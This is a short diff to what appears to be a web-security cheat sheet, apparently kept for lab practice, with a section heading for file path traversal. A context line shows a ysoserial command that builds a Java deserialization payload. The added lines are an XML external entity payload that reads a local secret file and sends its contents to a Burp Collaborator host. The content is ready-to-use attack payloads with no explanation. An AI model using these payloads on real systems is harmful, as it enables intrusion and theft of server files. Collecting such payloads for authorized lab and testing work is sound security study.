@@ -70,6 +70,12 @@ java -jar ysoserial-all.jar CommonsBeanutils1 "CMD" | gzip | base64 -w0
 %eval;
 %error;
 ```
+```xml
+<!ENTITY % file SYSTEM "file:///home/carlos/secret">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<YOUR_BURP_COLLAB>.burpcollaborator.net/?x=%file;'>">
+%eval;
+%exfil;
+```
 
 # File Path Traversal
 ```
